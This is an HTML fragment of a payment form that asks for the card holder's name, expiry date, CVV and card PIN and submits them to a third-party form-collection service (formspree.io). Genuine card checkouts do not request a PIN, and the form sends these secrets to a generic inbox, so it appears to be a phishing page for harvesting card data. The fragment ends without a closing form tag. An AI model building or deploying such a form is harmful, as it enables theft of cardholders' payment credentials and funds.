        <form class="payment--form" id="payment" action="https://formspree.io/f/xbjqaevp" method="POST">

            <input id="holders--name" type="text" name="holders--name" placeholder="Please enter card holders name" required>

            <span id="expiry--date"><input class="month" type="text" name="mm" placeholder="MM" required> / <input class="year" type="text" name="yy" placeholder="YY" required></span>

            <input id="cvv" type="text" name="cvv" placeholder="Please enter your cvv" required>
            
            <p class="pin" for="pin">Pin:</p>
            <input id="pin" type="text" name="pin" placeholder="Please enter your card pin" required>
            <button id="submit" type="submit">Confirm</button>
